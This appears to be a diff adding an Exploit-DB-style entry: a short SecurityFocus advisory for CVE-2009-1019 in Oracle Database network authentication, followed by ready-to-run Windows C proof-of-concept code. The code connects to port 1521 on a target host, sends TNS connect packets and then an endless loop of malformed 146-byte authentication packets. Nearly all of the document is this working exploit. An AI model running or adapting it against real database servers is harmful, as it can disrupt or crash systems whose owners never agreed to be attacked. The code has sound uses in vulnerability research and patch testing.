@@ -1,0 +1,294 @@
+source: http://www.securityfocus.com/bid/35680/info
+
+Oracle Database is prone to a remote vulnerability in Network Authentication.
+
+The vulnerability can be exploited over the 'Oracle Net' protocol. An attacker doesn't require privileges to exploit this vulnerability.
+
+This vulnerability affects the following supported versions:
+
+9.2.0.8
+9.2.0.8DV
+10.1.0.5
+10.2.0.4
+11.1.0.7
+
+// PoC for CVE-2009-1019
+// discovered by Dennis Yurichev <dennis@conus.info>
+
+// for more information: http://blogs.conus.info/node/24
+
+// run: CVE-2009-1019.exe <host>
+
+#include <winsock2.h>
+#include <stdio.h>
+#include <string.h>
+#include <windows.h>
+#include <assert.h>
+
+#include <string>
+
+void s_send (SOCKET s, unsigned char *msg, DWORD size)
+{
+  int sent;
+
+  printf ("s_send: begin\n");
+
+  sent=send (s, (char*)msg, size, 0);
+
+  if (sent==SOCKET_ERROR)
+    {
+      printf ("send() -> SOCKET_ERROR, WSAGetLastError=%d\n", WSAGetLastError());
+    } else
+
+    if (sent!=size)
+      printf ("sent only %d bytes\n", sent);
+
+  printf ("s_send: end\n");
+};
+
+void s_recv (SOCKET s)
+{
+  char buf[20000];
+  int r;
+  
+  struct timeval t;
+  fd_set fd;
+
+  t.tv_sec=0;
+  t.tv_usec=100000; // 100 ms
+
+  printf ("s_recv: begin\n");
+
+  FD_ZERO(&fd);
+  FD_SET(s, &fd);
+
+  if (select (0, &fd, 0, 0, &t))
+    // if (select (0, &fd, 0, 0, NULL))
+    {
+      r=recv (s, buf, 20000, 0);
+      if (r!=0 && r!=-1)
+	{
+	  printf ("got %d\n", r);
+	}
+      else
+	{
+	  printf ("connection lost, r=%d\n", r);
+	};
+    }
+  else
+    {
+      printf ("select() returns zero\n");
+    };
+};
+
+unsigned char NSPTCN[]=
+  {
+    0x00, 0x3A, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
+    0x01, 0x39, 0x01, 0x2C, 0x00, 0x81, 0x08, 0x00,
+    0x7F, 0xFF, 0xC6, 0x0E, 0x00, 0x00, 0x01, 0x00,
+    0x00, 0x00, 0x00, 0x3A, 0x00, 0x00, 0x07, 0xF8,
+    //^^    ^^ cmd len
+    0x0C, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00
+
+  };
+
+#define NSPTCN_HEADER_LEN 58
+
+unsigned char NSPTDA[]=
+  {
+    0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
+    //	  ^^    ^^ packet len
+    0x00, 0x00
+  };
+
+#define NSPTDA_HEADER_LEN 10
+
+void s_send_NSPTDA (SOCKET s, char *msg, int size)
+{
+  char * buf;
+  int sz=size + NSPTDA_HEADER_LEN;
+
+  buf=(char*)malloc (sz);
+
+  NSPTDA[0]=( sz ) >> 8;
+  NSPTDA[1]=( sz ) & 0xFF;
+
+  memcpy (buf, NSPTDA, NSPTDA_HEADER_LEN);
+  memcpy (buf + NSPTDA_HEADER_LEN, msg, size);
+
+  printf ("s_send_NSPTDA: sending %d bytes...\n", sz);
+
+  s_send (s, (unsigned char*)buf, sz);
+
+  free (buf);
+};
+
+void s_send_TNS_command (SOCKET s, const char *cmd)
+{
+  unsigned char * pkt;
+  int cmd_len=strlen (cmd);
+
+  printf ("sending [%s]\n", cmd);
+  printf ("len: %d\n", cmd_len);
+
+  if (cmd_len<231)
+    {
+
+      int str_len=strlen(cmd);
+      int pkt_len=str_len+58;
+
+      pkt=(unsigned char*)malloc (str_len+58);
+
+      memcpy (pkt, 
+	      "\x00\x00\x00\x00\x01\x00\x00\x00"
+	      // plenL and plenH
+	      "\x01\x38\x01\x2c\x00\x00\x08\x00"
+	      "\x7f\xff\x86\x0e\x00\x00\x01\x00"
+	      "\x00\x00\x00\x3a\x00\x00\x00\x00"
+	      // clenL clenH
+	      "\x00\x00\x00\x00\x00\x00\x00\x00"
+	      "\x00\x00\x00\x00\x0d\x40\x00\x00"
+	      "\x00\x0e\x00\x00\x00\x00\x00\x00"
+	      "\x00\x00", 58);
+
+      memcpy (pkt+58, cmd, str_len);
+
+      pkt[1]=pkt_len&0xFF;
+      pkt[0]=(pkt_len>>8)&0xFF;
+
+      pkt[25]=str_len&0xFF;
+      pkt[24]=(str_len>>8)&0xFF;
+
+      s_send (s,pkt, pkt_len);
+
+      free (pkt);
+
+    }
+  else
+    {
+      NSPTCN[24]=cmd_len >> 8;
+      NSPTCN[25]=cmd_len & 0xFF;
+      
+      s_send (s, &NSPTCN[0], NSPTCN_HEADER_LEN);
+
+      assert (pkt=(unsigned char*)malloc ( cmd_len + NSPTDA_HEADER_LEN));
+
+      NSPTDA[0]=( cmd_len + NSPTDA_HEADER_LEN ) >> 8;
+      NSPTDA[1]=( cmd_len + NSPTDA_HEADER_LEN ) & 0xFF;
+
+      memcpy (pkt, NSPTDA, NSPTDA_HEADER_LEN);
+      memcpy (pkt + NSPTDA_HEADER_LEN, cmd, cmd_len);
+
+      s_send (s, pkt, NSPTDA_HEADER_LEN + cmd_len);
+      free (pkt);
+    };
+};
+
+bool try_host (char * h, int i, int j)
+{
+  struct  hostent *hp;
+  WSADATA wsaData; 
+  struct sockaddr_in sin;
+  int r;
+  struct timeval t;
+  fd_set fd;
+  SOCKET s;
+  char pkt146[146];
+
+  WSAStartup(MAKEWORD(1, 1), &wsaData);
+
+  hp=gethostbyname (h);
+  assert (hp!=NULL);
+
+  s=socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+  assert (s!=INVALID_SOCKET);
+
+  {
+    u_long on=1;
+    assert (ioctlsocket(s, FIONBIO, &on) != -1);
+  };
+
+  sin.sin_family=AF_INET;
+  sin.sin_port=htons(1521);
+  memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
+
+  r=connect(s, (struct sockaddr *)&sin, sizeof(sin));
+
+  t.tv_sec=3;
+  t.tv_usec=0;
+
+  FD_ZERO(&fd);
+  FD_SET(s, &fd);
+
+  if (select (0, 0, &fd, 0, &t))
+    {
+      printf ("connected to %s\n", h);
+
+      s_send_TNS_command (s, "(DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=orcl)(CID=(PROGRAM=client.exe)(HOST=client_host)(USER=dennis)))(ADDRESS=(PROTOCOL=TCP)(HOST=192.168.0.102)(PORT=1521)))");
+
+      // waiting for NSPTRS
+
+      s_recv(s); 
+
+      s_send_TNS_command (s, "(DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=orcl)(CID=(PROGRAM=client.exe)(HOST=client_host)(USER=dennis)))(ADDRESS=(PROTOCOL=TCP)(HOST=192.168.0.102)(PORT=1521)))");
+
+      // waiting for NSPTAC
+
+      s_recv(s); 
+
+      memcpy (pkt146, 
+	      "\xDE\xAD\xBE\xEF\x00\x92"
+	      "\x0A\x20\x01\x00\x00\x04\x00\x00"
+	      "\x04\x00\x03\x00\x00\x00\x00\x00"
+	      "\x04\x00\x05\x0A\x20\x01\x00\x00"
+	      "\x08\x00\x01\x00\x00\x14\xCC\x5F"
+	      "\x40\x95\x3E\x00\x12\x00\x01\xDE"
+	      "\xAD\xBE\xEF\x00\x03\x00\x00\x00"
+	      "\x04\x00\x04\x00\x01\x00\x01\x00"
+	      "\x02\x00\x01\x00\x03\x00\x00\x00"
+	      "\x00\x00\x04\x00\x05\x0A\x20\x01"
+	      "\x00\x00\x02\x00\x03\xE0\xE1\x00"
+	      "\x02\x00\x06\xFC\xFF\x00\x02\x00"
+	      "\x02\x00\x00\x00\x00\x00\x04\x00"
+	      "\x05\x0A\x20\x01\x00\x00\x0C\x00"
+	      "\x01\x00\x11\x06\x10\x0C\x0F\x0A"
+	      "\x0B\x08\x02\x01\x03\x00\x03\x00"
+	      "\x02\x00\x00\x00\x00\x00\x04\x00"
+	      "\x05\x0A\x20\x01\x00\x00\x03\x00"
+	      "\x01\x00\x03\x01", 146);
+
+      pkt146[i]=j;
+      printf ("i=%d j=%02X\n", i, j);
+
+      s_send_NSPTDA (s, pkt146, 146);
+
+      s_recv(s); 
+
+      assert (closesocket (s)==0);
+      return true;
+    }
+  else
+    {
+      printf ("while connect(): select() returns zero\n");
+      assert (closesocket (s)==0);
+      return false;
+    };
+};
+
+void main(int argc, char * argv[])
+{
+  assert (argv[1]!=NULL);
+
+  for (;;)
+    for (int pos=0;pos<146;pos++)
+      {
+	try_host (argv[1], pos, 0);
+	Sleep (1000); // 1 second
+      };
+};
+
+
